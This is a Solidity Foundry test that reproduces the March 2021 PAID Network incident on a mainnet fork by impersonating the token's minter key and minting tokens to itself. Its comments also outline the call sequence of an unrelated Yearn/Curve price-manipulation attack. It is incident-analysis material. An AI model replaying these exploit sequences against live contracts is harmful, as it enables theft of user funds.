// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://paidnetwork.medium.com/paid-network-attack-postmortem-march-7-2021-9e4c0fef0e07
// Root cause: key compromised or rugged

// @TX
// https://etherscan.io/tx/0x4bb10927ea7afc2336033574b74ebd6f73ef35ac0db1bb96229627c9d77555a0

interface IPaid {
    function mint(address _owner, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ContractTest is Test {
    // FakeToken FakeTokenContract;
    IPaid PAID = IPaid(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 11_979_839); // Fork mainnet at block 11979839
    }

    function testExploit() public {
        cheats.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);
        PAID.mint(address(this), 59_471_745_571_000_000_000_000_000); //key compromised or rugged
        emit log_named_decimal_uint("[End] PAID balance after exploitation:", PAID.balanceOf(address(this)), 18);
    }

    receive() external payable {}
}

// Profile Template:
// interaction address: t1(dai), t2(usdc), t3(usdt), 
// victim contracts: v0(yvdai), v1(curve)
// dappName: YearnFinance
// Dapp function: DEX
// Attack vector: Initialize t1 and t2, t1.approve(v0), t2.approve(v1), t3.approve(v1), v1.add_liquidity([t1.balanceOf(this), t2.balanceOf(this), 0], 0), v1.remove_liquidity_imbalance([0, 0, t3.balanceOf(this)], 0), v0.deposit(t3.balanceOf(this)), v0.earn(), v1.add_liquidity([0, 0, t3.balanceOf(this)], 0), v0.withdrawAll(), v1.remove_liquidity_imbalance([t1.balanceOf(this) + 1, t2.balanceOf(this) + 1, 0], 0)
// Callback method: NaN
// Validation assertion: v0.balanceOf(c0), v1.balanceOf(c0)
// Root cause: The liquidity pool lacks the balance check adding liquidity and removing liquidity. Logic error incurred price manipulation.

// Profile:
// Ineteraction address: t1(PAID), c0(this)
// Victim contract: v0(PAID)
// Dapp function: Token for Smart contract management
// Attack vector: v0.mint(t1, 59_471_745_571_000_000_000_000_000)
// Validation assertion: v0.balanceOf(c0)
// Root cause: key compromised or rugged